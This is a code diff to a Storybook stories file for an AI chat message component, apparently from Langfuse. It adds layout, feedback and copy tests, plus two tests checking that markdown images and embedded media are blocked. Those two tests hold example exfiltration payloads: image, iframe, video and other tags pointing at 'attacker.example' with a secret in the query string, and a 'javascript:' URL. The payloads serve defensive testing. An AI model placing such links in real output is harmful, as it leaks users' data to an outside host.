@@ -1,10 +1,12 @@
 import preview from "../../../../.storybook/preview";
-import { expect, fn, userEvent, waitFor, within } from "storybook/test";
+import { expect, fn, spyOn, userEvent, waitFor, within } from "storybook/test";
 import { InAppAgentMessage } from "./InAppAgentMessage";
 
 const meta = preview.meta({
   component: InAppAgentMessage,
 });
+
+const storyTimestamp = new Date("2026-08-06T11:49:13.000Z").getTime();
 
 function copySelectedNode(node: Node, document: Document) {
   const range = document.createRange();
@@ -32,6 +34,7 @@ export const AssistantText = meta.story({
       type: "text",
       text: "Langfuse tracks traces, observations, scores, and metadata so teams can debug LLM applications.",
     },
+    timestamp: storyTimestamp,
   },
 });
 
@@ -179,6 +182,73 @@ export const AssistantMarkdown = meta.story({
   },
 });
 
+export const VariantMatrix = meta.story({
+  args: {
+    role: "assistant",
+    content: { type: "text", text: "Assistant response" },
+  },
+  render: () => (
+    <div className="grid max-w-3xl grid-cols-[6rem_1fr] gap-x-4 gap-y-6 p-6">
+      <p className="text-muted-foreground text-xs">User · default</p>
+      <InAppAgentMessage
+        role="user"
+        content={{
+          type: "text",
+          text: "Compare today's traces with yesterday.",
+        }}
+        timestamp={storyTimestamp}
+      />
+      <p className="text-muted-foreground text-xs">User · compact</p>
+      <InAppAgentMessage
+        role="user"
+        isCompact
+        content={{ type: "text", text: "Only show production errors." }}
+        timestamp={storyTimestamp}
+      />
+      <p className="text-muted-foreground text-xs">Assistant · settled</p>
+      <InAppAgentMessage
+        role="assistant"
+        content={{
+          type: "text",
+          text: "The error rate fell by **0.6 percentage points** while trace volume increased.",
+        }}
+        timestamp={storyTimestamp}
+        onSubmitFeedback={fn()}
+      />
+      <p className="text-muted-foreground text-xs">Assistant · streaming</p>
+      <InAppAgentMessage
+        role="assistant"
+        content={{
+          type: "text",
+          text: "I’m comparing the slowest observations against their scores…",
+          isStreaming: true,
+        }}
+        timestamp={storyTimestamp}
+      />
+      <p className="text-muted-foreground text-xs">Assistant · long</p>
+      <InAppAgentMessage
+        role="assistant"
+        content={{
+          type: "text",
+          text: [
+            "The main regression is concentrated in retrieval:",
+            "",
+            "| Step | p95 |",
+            "| --- | ---: |",
+            "| Vector search | 480 ms |",
+            "| Reranking | 3.91 s |",
+            "",
+            "```ts",
+            "const bottleneck = 'document-reranking';",
+            "```",
+          ].join("\n"),
+        }}
+        timestamp={storyTimestamp}
+      />
+    </div>
+  ),
+});
+
 export const CopyMarkdownSelectionInteraction = meta.story({
   name: "(Test) Copy Markdown Selection",
   args: {
@@ -270,6 +340,63 @@ export const CopyMarkdownSelectionInteraction = meta.story({
     );
     expect(codeClipboardData.getData("text/html")).not.toContain("Copy code");
     expect(codeClipboardData.getData("text/html")).not.toContain("button");
+  },
+});
+
+export const BlockedMarkdownImages = meta.story({
+  name: "(Test) Blocked Markdown Images",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: [
+        "Summary.",
+        ...[
+          "https://attacker.example/p.png?d=secret",
+          "//attacker.example/p.png",
+          `${window.location.origin}/image.png`,
+          "/image.png",
+          "https://media.example/bucket/media/image.png?signature=test",
+          "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
+          "data:image/png;base64,not-valid-base64",
+          "javascript:alert(1)",
+        ].map((url) => `![status](${url})`),
+      ].join("\n\n"),
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(canvasElement.querySelector("img")).toBeNull();
+  },
+});
+
+export const BlockedEmbeddedMedia = meta.story({
+  name: "(Test) Blocked Embedded Media",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: `Summary.
+
+<img src="https://attacker.example/p.png?d=secret" alt="status">
+<picture><source srcset="https://attacker.example/source.png"><img src="/image.png"></picture>
+<iframe src="https://attacker.example/frame"></iframe>
+<video poster="https://attacker.example/poster.png" src="https://attacker.example/video"></video>
+<audio src="https://attacker.example/audio"></audio>
+<object data="https://attacker.example/object"></object>
+<embed src="https://attacker.example/embed">
+<svg><image href="https://attacker.example/svg.png"></image></svg>`,
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(
+      canvasElement.querySelector(
+        "img, source, iframe, video, audio, object, embed, svg image",
+      ),
+    ).toBeNull();
   },
 });
 
@@ -433,12 +560,11 @@ export const RedirectActionWithParams = meta.story({
   },
 });
 
-export const LoadingToolCallGroup = meta.story({
+export const RunningToolCallGroup = meta.story({
   args: {
     role: "assistant",
     content: {
       type: "toolGroup",
-      isLoading: true,
       tools: [
         {
           type: "tool",
@@ -565,5 +691,182 @@ export const FeedbackPopoverInteraction = meta.story({
         body.queryByPlaceholderText("Optional feedback comment"),
       ).not.toBeInTheDocument();
     });
+  },
+});
+
+export const OptimisticFeedbackInteraction = meta.story({
+  name: "(Test) Optimistic Feedback",
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: "Langfuse tracks traces, observations, scores, and metadata so teams can debug LLM applications.",
+    },
+    onSubmitFeedback: fn(
+      () => new Promise<void>((resolve) => setTimeout(resolve, 1_000)),
+    ),
+  },
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    const body = within(canvasElement.ownerDocument.body);
+    const goodResponseButton = await canvas.findByRole("button", {
+      name: "Good response",
+    });
+
+    await userEvent.click(goodResponseButton);
+
+    expect(goodResponseButton).toHaveAttribute("aria-pressed", "true");
+    await expect(
+      body.findByPlaceholderText("Optional feedback comment"),
+    ).resolves.toBeInTheDocument();
+  },
+});
+
+export const CopyMessageInteraction = meta.story({
+  name: "(Test) Copy Whole Message",
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: "The **error rate** fell by `0.6 pp`.",
+    },
+    timestamp: storyTimestamp,
+  },
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    const write = spyOn(navigator.clipboard, "write").mockResolvedValue();
+
+    try {
+      await userEvent.hover(canvasElement);
+      await userEvent.click(
+        await canvas.findByRole("button", { name: "Copy message" }),
+      );
+
+      await waitFor(() =>
+        expect(
+          canvas.getByRole("button", { name: "Message copied" }),
+        ).toBeVisible(),
+      );
+      expect(write).toHaveBeenCalledOnce();
+    } finally {
+      write.mockRestore();
+    }
+  },
+});
+
+export const UserTextWithoutActionsInteraction = meta.story({
+  name: "(Test) User Text Without Actions",
+  args: {
+    role: "user",
+    content: {
+      type: "text",
+      text: "How do I find failed traces from the last 24 hours?",
+    },
+    timestamp: storyTimestamp,
+  },
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+
+    expect(
+      canvas.queryByRole("button", { name: "Copy message" }),
+    ).not.toBeInTheDocument();
+    expect(
+      canvas.queryByTestId("in-app-agent-message-actions"),
+    ).not.toBeInTheDocument();
+  },
+});
+
+const tableAndCodeMessage = [
+  "Proposed metric",
+  "",
+  "| Priority | Status | Note |",
+  "| --- | --- | --- |",
+  '| 1 | New | say "hi", please |',
+  "| 2 | Open | a\\|b |",
+  "",
+  "```ts",
+  "const bottleneck = 'document-reranking';",
+  "```",
+].join("\n");
+
+export const TableAndCode = meta.story({
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: tableAndCodeMessage,
+    },
+    timestamp: storyTimestamp,
+    onSubmitFeedback: fn(),
+  },
+});
+
+export const CopyTableAndCodeInteraction = meta.story({
+  name: "(Test) Copy Table And Code",
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: tableAndCodeMessage,
+    },
+    timestamp: storyTimestamp,
+  },
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    const copy = spyOn(navigator.clipboard, "writeText").mockResolvedValue();
+    const csvButton = canvas.getByRole("button", { name: "Copy table as CSV" });
+    const markdownButton = canvas.getByRole("button", {
+      name: "Copy table as Markdown",
+    });
+    const codeButton = canvas.getByRole("button", { name: "Copy code" });
+    const table = canvas.getByRole("table");
+    const codeBlock = canvasElement.querySelector("pre");
+    if (!codeBlock) {
+      throw new Error("Missing code block");
+    }
+
+    try {
+      await expect(csvButton).not.toBeVisible();
+      await expect(markdownButton).not.toBeVisible();
+      await expect(codeButton).not.toBeVisible();
+
+      csvButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        [
+          "Priority,Status,Note",
+          '1,New,"say ""hi"", please"',
+          "2,Open,a|b",
+        ].join("\n"),
+      );
+
+      markdownButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        [
+          "| Priority | Status | Note |",
+          "| --- | --- | --- |",
+          '| 1 | New | say "hi", please |',
+          "| 2 | Open | a\\|b |",
+        ].join("\n"),
+      );
+
+      codeButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        "const bottleneck = 'document-reranking';\n",
+      );
+
+      const block = table.parentElement?.parentElement;
+      if (!block) {
+        throw new Error("Missing table block");
+      }
+      const { clipboardData } = copySelectedNode(
+        block,
+        canvasElement.ownerDocument,
+      );
+      expect(clipboardData.getData("text/html")).not.toContain("button");
+      expect(clipboardData.getData("text/html")).not.toContain(".csv");
+      expect(clipboardData.getData("text/html")).not.toContain(".md");
+    } finally {
+      copy.mockRestore();
+    }
   },
 });
